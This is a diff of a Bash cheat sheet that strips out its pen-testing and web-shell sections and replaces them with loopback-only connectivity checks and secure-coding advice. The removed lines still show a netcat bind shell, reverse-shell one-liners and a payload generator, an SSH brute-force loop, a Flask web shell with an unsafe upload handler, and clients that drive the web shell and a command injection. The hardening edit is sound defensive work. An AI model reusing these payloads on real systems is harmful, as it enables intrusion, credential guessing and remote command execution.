@@ -216,37 +216,38 @@ fi
 ```
 
 ### Recursive File Search & Backup
-```bash
-#!/bin/bash
-DIR_SEARCH="${1:-/var/log}"
-DIR_BACKUP="${HOME}/backup"
-COMPRESSED_FILE="${HOME}/files.tar.gz"
+This GNU/Linux example creates a unique temporary staging directory, preserves
+relative paths, refuses to overwrite the archive, and removes only the temporary
+directory it created. Review the source directory first because backup files
+may contain sensitive data.
 
-# Check if search directory exists
-if [[ ! -d "${DIR_SEARCH}" ]]; then
-    echo "${DIR_SEARCH} is not a directory."
+```bash
+#!/usr/bin/env bash
+set -euo pipefail
+
+SOURCE_DIR="${1:-/var/log}"
+ARCHIVE="${HOME}/files-$(date +%Y%m%d-%H%M%S).tar.gz"
+
+if [[ ! -d "${SOURCE_DIR}" ]]; then
+    printf 'Not a directory: %s\n' "${SOURCE_DIR}" >&2
+    exit 1
+fi
+if [[ -e "${ARCHIVE}" ]]; then
+    printf 'Refusing to overwrite: %s\n' "${ARCHIVE}" >&2
     exit 1
 fi
 
-# Create backup directory
-mkdir -p -- "${DIR_BACKUP}"
+STAGING_DIR="$(mktemp -d "${TMPDIR:-/tmp}/log-backup.XXXXXXXX")"
+trap 'rm -rf -- "${STAGING_DIR}"' EXIT
 
-# Copy readable files
-while IFS= read -r file; do 
-    echo "Copying ${file} to ${DIR_BACKUP}"
-    cp -f "${file}" "${DIR_BACKUP}"
-done < <(find "${DIR_SEARCH}" -type f -readable 2>/dev/null)
+while IFS= read -r -d '' file; do
+    relative_path="${file#"${SOURCE_DIR%/}/"}"
+    mkdir -p -- "${STAGING_DIR}/$(dirname -- "${relative_path}")"
+    cp -- "${file}" "${STAGING_DIR}/${relative_path}"
+done < <(find "${SOURCE_DIR}" -type f -readable -print0)
 
-# Compress if backup has files
-if [[ -n $(ls -A "${DIR_BACKUP}") ]]; then
-    echo "Compressing files..."
-    tar czvfP "${COMPRESSED_FILE}" "${DIR_BACKUP}"
-    echo "Compressed to ${COMPRESSED_FILE}"
-else
-    echo "${DIR_BACKUP} is empty."
-fi
-
-rm -rf "${DIR_BACKUP}"
+tar -czf "${ARCHIVE}" -C "${STAGING_DIR}" .
+printf 'Archive created: %s\n' "${ARCHIVE}"
 ```
 
 ### File Operations
@@ -258,8 +259,9 @@ tail -f file.txt                     # Follow file (live)
 
 cp source dest                       # Copy
 mv old new                           # Move/rename
-rm file                              # Delete
-rm -rf directory                     # Delete directory recursively
+rm -- file                           # Delete one named file
+# Recursive deletion is destructive: inspect and validate the exact path first.
+rm -r -- directory
 
 touch file.txt                       # Create empty file
 echo "text" > file.txt               # Overwrite
@@ -350,11 +352,13 @@ wget --spider http://example.com                  # Check if exists
 ```
 
 ### netcat (nc)
+Use netcat only for simple, authorized connectivity checks. Do not attach a shell
+to a listener.
+
 ```bash
-nc -lvnp 4444                        # Listen on port 4444
-nc 192.168.1.100 4444                # Connect to target
-nc -lvnp 4444 -e /bin/bash           # Bind shell
-echo "data" | nc 192.168.1.100 80    # Send data
+# Local lab: open a listener in one terminal, then connect from another.
+nc -l 127.0.0.1 4444
+printf 'test\\n' | nc 127.0.0.1 4444
 ```
 
 ### Network Info
@@ -407,173 +411,75 @@ whereis command                      # Locate binary/man page
 
 ---
 
-## Pen Testing Patterns
+## Security Testing Patterns
 
-### Port Scanning
+Keep security testing within an explicitly authorized scope. For routine
+connectivity troubleshooting, check a single service on a host you administer
+and avoid collecting credentials or opening command interpreters.
+
 ```bash
-#!/bin/bash
-host="${1}"
+#!/usr/bin/env bash
+set -u
 
-for port in {1..1024}; do
-    timeout 1 bash -c "echo >/dev/tcp/${host}/${port}" 2>/dev/null && \
-        echo "Port ${port} is open"
-done
+host="${1:-127.0.0.1}"
+port="${2:-8080}"
+
+if [[ "${host}" != "127.0.0.1" && "${host}" != "localhost" ]]; then
+    printf 'This example is limited to loopback; use approved tools and scope for other hosts.\n' >&2
+    exit 2
+fi
+if [[ ! "${port}" =~ ^[0-9]+$ ]] || (( port < 1 || port > 65535 )); then
+    printf 'Port must be an integer from 1 to 65535.\n' >&2
+    exit 2
+fi
+
+if timeout 2 bash -c ':</dev/tcp/"$1"/"$2"' _ "${host}" "${port}" 2>/dev/null; then
+    printf 'A service accepted a TCP connection on %s:%s.\n' "${host}" "${port}"
+else
+    printf 'No TCP connection to %s:%s.\n' "${host}" "${port}"
+fi
 ```
 
-### Simple Reverse Shell Listener
-```bash
-#!/bin/bash
-port="${1:-4444}"
-
-echo "[*] Listening on port ${port}..."
-while true; do
-    nc -lvnp "${port}"
-    echo "[*] Connection closed. Listening again..."
-done
-```
-
-### Brute Force Template
-```bash
-#!/bin/bash
-target="${1}"
-userlist="${2}"
-passlist="${3}"
-
-while IFS= read -r user; do
-    while IFS= read -r pass; do
-        # Attempt authentication
-        result=$(sshpass -p "${pass}" ssh -o StrictHostKeyChecking=no \
-                 "${user}@${target}" "echo success" 2>&1)
-        
-        if [[ "${result}" == "success" ]]; then
-            echo "[+] Valid credentials: ${user}:${pass}"
-            exit 0
-        fi
-    done < "${passlist}"
-done < "${userlist}"
-```
-
-### Payload Generation
-```bash
-#!/bin/bash
-lhost="${1}"
-lport="${2}"
-
-# Generate reverse shell payload
-cat << EOF > shell.sh
-#!/bin/bash
-bash -i >& /dev/tcp/${lhost}/${lport} 0>&1
-EOF
-
-chmod +x shell.sh
-echo "[+] Payload created: shell.sh"
-```
+A successful connection only establishes that a TCP service responded; it does not
+identify the service or establish that it is secure. For broader assessment,
+define written scope, rate limits, test windows, data-handling rules, and stop
+conditions first.
 
 ---
 
-## Web Shell Scripts
+## Web Application Security Patterns
 
-### Python Web Shell Injection
+Do not expose an HTTP endpoint that accepts a command, passes it to a shell, or
+renders a template with an execution hook. That design creates remote command
+execution. Avoid debug mode in deployed Flask applications, and do not trust an
+uploaded filename or client-supplied MIME type as proof that a file is safe.
+
+For legitimate application features, use fixed server-side actions and validated
+data. When a subprocess is genuinely needed, pass a fixed executable and an
+argument list (not user-controlled shell text), allowlist accepted values, run
+with least privilege, set timeouts, and avoid returning sensitive output to the
+requester. Prefer avoiding subprocesses in web request handlers entirely.
+
+A harmless Flask health endpoint can return fixed status without invoking system
+commands:
+
 ```python
-import os, subprocess
-from flask import Flask, render_template, request, send_file
-
-def execute(cmd):
-    return os.popen(cmd).read()
+from flask import Flask, jsonify
 
 app = Flask(__name__)
-app.debug = True
-app.config['UPLOAD_FOLDER'] = "uploads/"
-app.jinja_env.globals.update(execute=execute)
 
-@app.route('/')
-def hello_world():
-    return render_template('index.html')
+@app.get("/health")
+def health():
+    return jsonify(status="ok")
 
-@app.route('/upload', methods=['POST'])
-def upload():
-    allowed_types = ['image/jpeg', 'image/png', 'image/gif']
-    f = request.files['file']
-    
-    if f.content_type not in allowed_types:
-        return 'File type not allowed!'
-    
-    f.save(os.path.join(app.config['UPLOAD_FOLDER'], f.filename))
-    return 'Upload successful!'
-
-# Malicious web shell
-@app.route('/webshell/<command>')
-def webshell(command):
-    result = subprocess.check_output(command, shell=True)
-    return result.decode('utf-8')
+if __name__ == "__main__":
+    # For local development only; use a production WSGI server when deployed.
+    app.run(host="127.0.0.1", port=5000, debug=False)
 ```
 
-### Python Web Shell Checker
-```python
-import subprocess
-
-# Test web shell
-result = subprocess.check_output('id', shell=True)
-print(result.decode('utf-8'))
-```
-
-### Bash Web Shell Client
-```bash
-#!/bin/bash
-
-read -rp 'Host: ' host
-read -rp 'Port: ' port
-
-while true; do
-    read -rp '$ ' raw_command
-    command=$(printf %s "${raw_command}" | jq -sRr @uri)
-    
-    response=$(curl -s -w "%{http_code}" -o /dev/null \
-               "http://${host}:${port}/webshell/${command}")
-    http_code=$(tail -n1 <<< "$response")
-
-    if [[ "${http_code}" =~ ^[0-9]+$ ]]; then
-        if [[ "${http_code}" -eq 200 ]]; then
-            curl "http://${host}:${port}/webshell/${command}"
-        else
-            echo "Error: HTTP ${http_code}"
-        fi
-    else
-        echo "Error: Invalid HTTP status"
-    fi
-done
-```
-
-### OS Command Injection Client
-```bash
-#!/bin/bash
-
-read -rp 'Host: ' host
-read -rp 'Port: ' port
-
-while true; do
-    read -rp '$ ' raw_command
-    command=$(printf %s "${raw_command}" | jq -sRr @uri)
-
-    # Get previous output
-    prev_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")
-
-    # Execute injection
-    curl -s -o /dev/null "http://${host}:${port}/donate.php?amount=1|${command}"
-    
-    # Get new output
-    new_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")
-    
-    # Extract difference
-    delta=$(diff --new-line-format="%L" \
-                 --unchanged-line-format="" \
-                 <(echo "${prev_resp}") <(echo "${new_resp}"))
-
-    echo "${delta}"
-done
-```
-
----
+For upload handling, generate a server-side filename, enforce size limits, check
+content using appropriate libraries, store files outside the web root, and
+authorize access to them. Do not build a shell command from a request parameter.
 
 ## Error Handling
 
@@ -671,8 +577,8 @@ find / -writable -type d 2>/dev/null
 # Find files modified in last 7 days
 find /path -type f -mtime -7
 
-# Check if port is open
-timeout 1 bash -c "echo >/dev/tcp/192.168.1.1/80" && echo "Open"
+# Check one local development port
+timeout 1 bash -c ':</dev/tcp/127.0.0.1/8080' && echo "Open on localhost"
 
 # Extract IPs from file
 grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' file.txt
@@ -690,9 +596,6 @@ printf '%s' "text with spaces" | jq -sRr @uri
 # Download only after verifying the HTTPS source and exact version.
 # Then inspect and check its published signature/checksum BEFORE running.
 # No examples here execute unknown network content directly.
-
-# Reverse shell
-bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 
 # No backdoor accounts in general-purpose automation.
 # Use approved account provisioning and least-privilege group assignments.
@@ -749,20 +652,12 @@ ldapsearch                           # LDAP queries
 
 ---
 
-## Security and Ethical Considerations ⚠️
+## Security and Responsible Use
 
-**IMPORTANT**: The pen-testing patterns and web shell scripts in this cheat sheet are for **authorized security testing only**. Unauthorized use is illegal.
-
-* **Authorization:** Get **written permission** before running any reconnaissance or exploitation pattern from this file against a target you don't own.
-* **Isolated Testing:** Test web shell and enumeration scripts in an **isolated lab environment** first.
-* **Legal Compliance:** Strictly comply with all local laws and regulations.
-
-**Legal Use Cases:**
-* Penetration testing with client authorization.
-* Testing your own home or lab network security.
-* Security research in isolated lab environments.
-
----
+Examples that interact with systems should be run only within an approved scope. A general
+authorization warning does not make every tool or technique appropriate: define permitted
+targets, rate limits, timing, data handling, and stop conditions before testing. Use
+purpose-built defensive tooling and a controlled lab for security education.
 
 ## Related Files
 - [../README.md](../README.md) - Scripts section index
